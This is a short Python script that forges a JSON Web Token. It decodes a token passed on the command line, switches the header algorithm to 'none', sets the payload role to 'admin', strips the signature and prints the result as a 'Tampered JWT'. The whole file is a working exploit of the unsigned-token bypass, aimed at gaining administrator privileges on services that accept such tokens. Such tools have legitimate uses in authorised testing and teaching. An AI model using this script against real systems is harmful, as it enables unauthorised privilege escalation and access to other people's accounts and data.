import base64
import json
import sys

original_jwt = sys.argv[1]

header_b64, payload_b64, signature = original_jwt.split('.')

def b64_decode(data):
    padding = '=' * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)

header = json.loads(b64_decode(header_b64))
payload = json.loads(b64_decode(payload_b64))

header['alg'] = 'none'
payload['role'] = 'admin'

def b64_encode(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip('=')

new_header_b64 = b64_encode(header)
new_payload_b64 = b64_encode(payload)

new_jwt = f"{new_header_b64}.{new_payload_b64}."

print("Tampered JWT:\n", new_jwt)